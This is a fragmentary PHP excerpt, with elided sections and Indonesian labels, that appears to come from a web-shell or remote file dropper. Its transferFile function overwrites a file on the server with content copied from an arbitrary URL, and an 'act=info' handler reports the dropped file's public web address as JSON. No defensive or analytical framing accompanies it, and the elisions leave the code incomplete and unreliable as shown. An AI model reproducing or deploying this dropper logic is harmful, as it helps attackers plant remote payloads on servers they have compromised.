...
function transferFile($xurl, $xpath, $xname){
	...
	if(AvFunc(array('file_put_contents', 'file_get_contents'))){
		...
		if(file_exists($xpath."/".$xname)){@unlink($xpath."/".$xname);}
		$outs[] = @copy($xurl, $xpath."/".$xname) ? $xname." uploaded!" : $xname." failed!";
...
if(isset($_GET['act'])){
	if($_GET['act'] == 'info'){
		...
		if(is_writable($lokasiberkas)){
			...
			if(file_exists($lokasiberkas."/".$fnames)){
				$outs = array('error' => 0, 'message' => $weburl."/".$fnames);
			} else {
				$outs = array('error' => 1, 'message' => 'gagal!');
			}
		}
		header("Content-type: application/json; charset=utf-8");
		echo json_encode($outs);
